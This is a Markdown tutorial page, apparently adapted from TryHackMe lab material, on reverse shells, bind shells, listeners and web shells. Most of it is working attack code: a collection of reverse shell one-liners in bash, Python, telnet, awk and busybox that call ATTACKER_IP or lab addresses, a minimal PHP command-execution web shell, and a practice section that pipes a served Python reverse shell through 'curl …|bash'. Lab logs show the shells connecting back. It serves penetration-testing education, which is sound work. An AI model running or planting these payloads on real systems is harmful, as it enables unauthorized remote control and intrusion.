---
title: "Shells"
categories:
  - 技术
  - 教程
tags: [Markdown, Shells]
draft: true
sidebar: false
outline: 2
---

# Shells

Shells in cyber security are widely used by attackers to remotely control systems, making them an important part of the attack chain. 

A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.

In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, some of which are described below.

- `Remote System Control`: allows the attacker to execute commands or software remotely in the target system.
- `Privilege Escalation`: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
- `Data Exfiltration`: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
- `Persistence and Maintenance Access`: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
- `Post-Exploitation Activities`: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
- `Access Other Systems on the Network`: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.

## Reverse Shell

A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

**Set up a Netcat (nc) Listener**

Let's now understand how a reverse shell works in a practical scenario using the tool [Netcat](./tools.md#netcat). This utility supports multiple OSs and allows reading and writing through a network.

As mentioned above, a reverse shell will connect back to the attacker's machine. This machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command `nc -lvnp 443`.

```bash
root@ip-10-10-132-149:~# nc -lvnp 443
Listening on 0.0.0.0 443

```
- `-l` option to indicate Netcat to listen or wait for a connection. 
- `-v` option enables verbose mode. 
- `-n` option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. 
- `-p` flag indicates the port that will be used to wait for the connection, in the case above, port 443.

**Gaining Reverse Shell Access**

Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There's a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

As an example, let's analyze an example payload named a pipe reverse shell, as shown below.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

**Explanation of the Payload**

- `rm -f /tmp/f` - This command removes any existing [named pipe](../linux/LinuxFundamentals.md#named-pipe) file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
- `mkfifo /tmp/f` - This command creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
- `>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

The payload above can expose the shell **bash** through the network to the desired listener.


```bash
ubuntu@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.132.149 443 >/tmp/f
```
**Attacker Terminal Output (Receiving Shell)**
```bash
root@ip-10-10-132-149:~# nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.198.20 40592
$ whoami
ubuntu
```

## Bind Shell 

As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection

<span style="font-size: 23px;">**How bind shells work**</span>

**Setting Up the Bind Shell on the Target**

Let's create a bind shell. In this case, the attacker can use a command like the one below on the target machine.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

**Explanation of the Payload**

- `rm -f /tmp/f` - This command removes any existing [named pipe](../linux/LinuxFundamentals.md#named-pipe) file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
- `mkfifo /tmp/f` - This command creates a named pipe, or FIFO, at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring error messages are returned to the attacker.
- `| nc -l 0.0.0.0 8080` - Starts Netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`. The shell will be exposed to the attacker once they connect to this port.
- `>/tmp/f` This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.

The command above will listen for incoming connections and expose a bash shell. We need to note that ports below 1024 will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.

**Terminal on the Target Machine (Bind Shell Setup)**

```bash
ubuntu@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Once the command is executed, it will wait for an incoming connection, as shown above.

**Attacker Connects to the Bind Shell**

Now that the target machine is waiting for incoming connections, we can use Netcat again with the following command to connect.

`nc -nv TARGET_IP 8080`

**Explanation of the command**

- `nc` - This invokes Netcat, which establishes the connection to the target.
- `-n` - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
- `-v` - Verbose mode provides detailed output of the connection process, such as when the connection is established.
- `TARGET_IP` - The IP address of the target machine where the bind shell is running.
- `8080` - The port number on which the bind shell listens.

**Attacker Terminal (After Connection)**

```bash
root@ip-10-10-132-149:~# nc -nv 10.10.198.20 8080
Connection to 10.10.198.20 8080 port [tcp/*] succeeded!
ubuntu@tryhackme:~$ 
```
After connecting, we can get a shell, as shown above, and execute commands.

## Shell Listeners 

As we learned in previous tasks, a reverse shell will connect from the compromised target to the attacker's machine. A utility like Netcat will handle the connection and allow the attacker to interact with the exposed shell, but Netcat is not the only utility that will allow us to do that.

Let's explore some tools that can be used as listeners to interact with an incoming shell.

<span style="font-size: 23px;">**Rlwrap**</span>

It is a small utility that uses the GNU readline library to provide editing keyboard and history.

**Usage Example (Enhancing a Netcat Shell With Rlwrap)**

```bash
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

This wraps `nc` with `rlwrap`, allowing the use of features like arrow keys and history for better interaction.

<span style="font-size: 23px;">**Ncat**</span>

Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).

**Usage Example (Listening for Reverse Shells)**

```bash
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```
**Usage Example (Listening for Reverse Shells with SSL)**

```bash
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

The `--ssl` option enables SSL encryption for the listener.

<span style="font-size: 23px;">**Socat**</span>

It is a utility that allows you to create a [socket](./WebApplication.md#socket) connection between two data sources, in this case, two different hosts.

**Default Usage Example (Listening for Reverse Shell):**

```bash
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

The command above used the `-d` option to enable verbose output; using it again (`-d -d`) will increase the verbosity of the commands. The `TCP-LISTEN:443` option creates a TCP listener on port `443`, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal.

## Shell Payloads

A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.

Let's explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular reverse shell.

<span style="font-size: 23px;">**Bash**</span>

**Normal Bash Reverse Shell**

```bash
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```
This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.

**Bash Read Line Reverse Shell**

```bash
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```
This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.

**Bash With File Descriptor 196 Reverse Shell**

```bash
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```
This reverse shell uses a file descriptor (`196` in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.

**Bash With File Descriptor 5 Reverse Shell**

```bash
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

Similar to the first example, this command opens a shell (`bash -i`), but it uses file descriptor `5` for input and output, enabling an interactive session over the TCP connection.

<span style="font-size: 23px;">**Python**</span>

**Please note, the following snippets below require using `python -c` to run, indicated by the placeholder `PY-C`**

**Python Reverse Shell by Exporting Environment Variables**

```bash
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```

This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

**Python Reverse Shell Using the subprocess Module**

```bash
target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```
This reverse shell uses the `subprocess` module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.

**Short Python Reverse Shell**

```bash
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
This reverse shell creates a socket (`s`), connects to the attacker, and redirects standard input, output, and error to the socket using `os.dup2()`.

<span style="font-size: 23px;">**Others**</span>

**Telnet**

```bash
target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```
This reverse shell creates a named pipe using `mkfifo` and connects to the attacker via Telnet on IP `ATTACKER_IP` and port `443`. 

**AWK**

```bash
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
This reverse shell uses AWK’s built-in TCP capabilities to connect to `ATTACKER_IP:443`. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.

**BusyBox**

```bash
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
```
This BusyBox reverse shell uses Netcat (`nc`) to connect to the attacker at `ATTACKER_IP:443`. Once connected, it executes `/bin/sh`, exposing the command line to the attacker.

## Web Shell

A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts. 

<span style="font-size: 23px;">**Example PHP Web Shell**</span>

Let's look at an example PHP web shell to understand how this process works:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
The above shell can be saved into a file with the PHP extension, like shell.php, and then uploaded into the web server by the attacker by exploiting vulnerabilities such as **Unrestricted File Upload**, **File Inclusion**, **Command Injection**, among others, or by gaining unauthorized access to it. 

After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, in this example `http://victim.com/uploads/shell.php`. As we observed from the code in `shell.php`, we need to provide a GET method and the value of the variable cmd, which should contain the command the attacker wants to execute. For example, if we want to execute the command whoami the request to the URL should be:

`http://victim.com/uploads/shell.php?cmd=whoami`

<span style="font-size: 23px;">**Existing Web Shells Available Online**</span>

The power of supported languages by the web servers can result in web shells with lots of functionality and avoid detection at the same time. Let's explore some of the most popular web shells that can be found online 

- [p0wny-shell](https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution.

- [b374k shell](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.

- [c99 shell](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality.

You can find more web shells at: https://www.r57shell.net/index.php.

## Practice

### html-reverse-shell

**index.html**
```html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.46.233",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'   
```

`curl 10.11.72.22:8090|bash`

```bash                                
┌──(root㉿kali)-[~]
└─# cat index.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.46.233",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
┌──(root㉿kali)-[~]
└─# python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
10.10.160.117 - - [02/Jul/2025 08:04:03] "GET / HTTP/1.1" 200 -

┌──(root㉿kali)-[~]
└─# nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.46.233] from (UNKNOWN) [10.10.160.117] 49140
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```